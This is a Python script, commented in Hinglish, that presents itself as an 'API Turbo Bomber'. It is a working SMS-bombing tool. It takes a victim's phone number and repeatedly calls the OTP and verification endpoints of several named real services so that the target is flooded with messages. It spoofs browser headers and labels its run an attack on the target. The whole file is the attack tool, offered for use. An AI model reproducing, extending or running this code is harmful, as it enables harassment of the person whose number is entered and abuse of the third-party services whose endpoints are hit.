import requests
import os
import json
import time

# --- COLOR CODES ---
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# --- API DATABASE ---
# Jo JSON aapne diya tha, uske kuch working examples yahan hain
# Aap is list mein aur bhi APIs add kar sakte hain
SMS_APIS = [
    {
        "name": "justdial",
        "method": "GET",
        "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
        "params": {"mobile": "{target}"}
    },
    {
        "name": "confirmtkt",
        "method": "GET",
        "url": "https://securedapi.confirmtkt.com/api/platform/register",
        "params": {"newOtp": "true", "mobileNumber": "{target}"}
    },
    {
        "name": "housing",
        "method": "POST",
        "url": "https://login.housing.com/api/v2/send-otp",
        "data": {"phone": "{target}"}
    },
    {
        "name": "frotels",
        "method": "POST",
        "url": "https://www.frotels.com/appsendsms.php",
        "data": {"mobno": "{target}"}
    },
    {
        "name": "unacademy",
        "method": "POST",
        "url": "https://unacademy.com/api/v1/user/get_app_link/",
        "data": {"phone": "{target}"}
    }
]

def clear_screen():
    os.system("clear")

def main():
    clear_screen()
    print(f"{GREEN}========================================")
    print("      🚀 API TURBO BOMBER v9.0         ")
    print(f"========================================{RESET}\n")

    # Wahi purana feature: Target Number mangna
    target = input("Enter Target Number: ")
    
    # Mode selection
    print("\nSelect Mode:")
    print("1. SMS Mode (API Fast)")
    print("2. Call Mode (Coming Soon)")
    choice = input("\nChoice: ")

    if choice != "1":
        print("Abhi sirf SMS Mode ready hai!"); return

    limit = input("How many SMS to send? (e.g. 50): ")
    
    print(f"\n{GREEN}[*] Starting API Attack on {target}...{RESET}")
    print("[*] Press CTRL+C to stop.\n")

    count = 0
    try:
        while count < int(limit):
            for api in SMS_APIS:
                if count >= int(limit): break
                
                try:
                    # Target number ko JSON ki jagah fit karna
                    url = api["url"]
                    
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
                        "Referer": "https://google.com"
                    }

                    if api["method"] == "GET":
                        # Params mein target number dalna
                        params = {k: v.replace("{target}", target) for k, v in api.get("params", {}).items()}
                        response = requests.get(url, params=params, headers=headers, timeout=5)
                    
                    else:
                        # POST data mein target number dalna
                        data = {k: v.replace("{target}", target) for k, v in api.get("data", {}).items()}
                        response = requests.post(url, data=data, headers=headers, timeout=5)

                    count += 1
                    print(f"{GREEN}[{count}] Sent via {api['name']} | Status: {response.status_code}{RESET}")
                    time.sleep(0.5) # Fast speed but safe gap

                except Exception:
                    print(f"{RED}[!] Failed via {api['name']}{RESET}")
                    continue

    except KeyboardInterrupt:
        print(f"\n{RED}[!] Stopped by user.{RESET}")

    print(f"\n{GREEN}--- ATTACK FINISHED: {count} Sent ---{RESET}")

if __name__ == "__main__":
    main()
